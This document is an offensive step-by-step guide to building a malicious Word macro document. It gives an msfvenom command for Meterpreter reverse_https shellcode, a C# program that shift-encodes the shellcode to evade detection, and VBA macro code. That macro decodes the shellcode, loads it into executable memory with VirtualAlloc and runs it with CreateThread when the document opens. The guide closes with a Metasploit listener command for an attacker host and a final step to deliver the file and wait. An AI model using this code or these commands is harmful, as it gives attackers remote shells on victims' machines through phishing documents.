# Encypted C# VBA

### 1) Create shellcode

    # If something is not working consider using 32-bits payloads (windows/meterpreter/reverse_http)    
    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[LHOST] LPORT=[LPORT] EXITFUNC=thread -f csharp

### 2) Encrypt the shellcode

C# VBA Encrypter

    using System;
    using System.Collections.Generic;
    using System.Linq;
    using System.Text;
    using System.Threading.Tasks;
    
    namespace vba_encrypter
    {
        class Program
        {
            static void Main(string[] args)
            {
                byte[] buf = new byte[681] {0xfc,0xe8,0x8f,0x00,0x00,0x00,
    0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,
    ....
    0x53,0xff,0xd5};
                byte[] encoded = new byte[buf.Length];
                for (int i = 0; i < buf.Length; i++)
                {
                    encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
                }
                uint counter = 0;
                StringBuilder hex = new StringBuilder(encoded.Length * 2);
                foreach (byte b in encoded)
                {
                    hex.AppendFormat("{0:D}, ", b);
                    counter++;
                    if (counter % 50 == 0)
                    {
                        hex.AppendFormat("_{0}", Environment.NewLine);
                    }
                }
                Console.WriteLine("The payload is: " + hex.ToString());
            }
        }
    }

### 3) Create the Macro file

Use code below inserting your encrypted shellcode and save the file as a .docm

    Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
    
    Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    
    Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
    
    
    Function MyMacro()
        Dim buf As Variant
        Dim addr As LongPtr
        Dim counter As Long
        Dim data As Long
        Dim res As LongPtr
        
        
        buf = Array(254, 234, 145, ..., 85, 1, 215)
    
        For i = 0 To UBound(buf)
        buf(i) = buf(i) - 2
        Next i
        
        addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
        For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
        Next counter
        
        res = CreateThread(0, 0, addr, 0, 0, 0)
    End Function
    
    Sub Document_Open()
        MyMacro
    End Sub
    
    Sub AutoOpen()
        MyMacro
    End Sub

### 4) Start Metasploit listener

    sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost [ATTACKER_IP]; set lport [PORT]; exploit"

### 5) Deliver Macro and wait for execution
